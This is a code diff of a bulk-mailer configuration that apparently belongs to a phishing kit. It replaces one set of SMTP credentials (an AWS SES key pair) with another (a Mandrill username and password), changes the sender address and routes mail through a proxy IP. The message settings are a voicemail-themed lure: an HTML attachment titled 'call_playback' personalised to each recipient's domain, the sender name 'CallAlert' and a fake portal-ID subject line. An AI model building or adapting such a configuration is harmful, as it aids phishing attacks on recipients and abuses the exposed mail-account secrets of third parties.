@@ -102,12 +102,12 @@ const options = {
   useAuthentication: true,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'email-smtp.ap-northeast-2.amazonaws.com',
-  smtpPort: 25,
+  smtpHost: 'smtp.mandrillapp.com',
+  smtpPort: 587,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
-  smtpUsername: 'AKIAZTM3XEHWBD73JOW7',
-  smtpPassword: 'BCKkCiiGjKx3mEm0d25gweHOUddk0EyvKkP9cJTU2u2k',
+  smtpUsername: 'carnecrea@lit.com.uy',
+  smtpPassword: 'X2FHSuGbBPu71QnYna4yiQ',
   proxyHost: '63.160.189.222',
   proxyPort: 35149,
   proxyUsername: 'user',
@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['submit@nj-qs.com'];
+const senderAddresses = ['carnecrea@lit.com.uy'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "CallAlert"; 
 const subjectLineWithPlaceholders = "New V.M.A-Portal ID-{RANDOM_MD5}";
